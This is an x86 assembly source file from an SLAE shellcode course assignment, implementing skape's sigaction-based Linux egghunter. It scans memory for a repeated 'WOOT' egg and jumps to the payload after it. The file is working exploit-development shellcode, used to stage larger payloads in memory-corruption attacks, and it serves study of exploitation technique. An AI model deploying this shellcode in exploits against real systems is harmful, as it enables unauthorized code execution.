; SLAE Assignment #03: Egghunter
; AUTHOR: SLAE-1262 (using the Egghunter source from skape)
; http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
; Change egg down at marked location ("CHANGEME")

global _start

section .text

_start:

	;### EGGHUNTER ###
	
	xor ecx, ecx	;Important: zero out ecx!

align_page:
	or cx, 0xfff	;set pagesize = 4095 for page alignment

next_address:
	inc ecx		;
	push byte +0x43	;0x43 = 67 for sigaction(2) on stack
	pop eax		;syscall = 67 for sigaction
	int 0x80	;run sigaction syscall
	cmp al,0xf2	;check for EFAULT as return value
	jz align_page	;if EFAULT occured -> invalid pointer -> try next page
	;########CHANGEME####################################################################CHENGEME###
	mov eax, 0x544F4F57 ;if no EFAULT occured -> load Egg (in reverse order) for checking (here WOOT) CHANGE EGG HERE
	;########CHANGEME####################################################################CHENGEME###
	mov edi,ecx	;load valid address in edi for comparing its content with egg in eax
	scasd		;compare eax with content of edi (and increment edi by 4)
	jnz next_address;no match -> try next address
	scasd		;first part matched, check second (and incremnt by 4) ESI could point to payload now
	jnz next_address;no (complete) match -> try next address
	jmp edi		;egg found -> pass control to payload
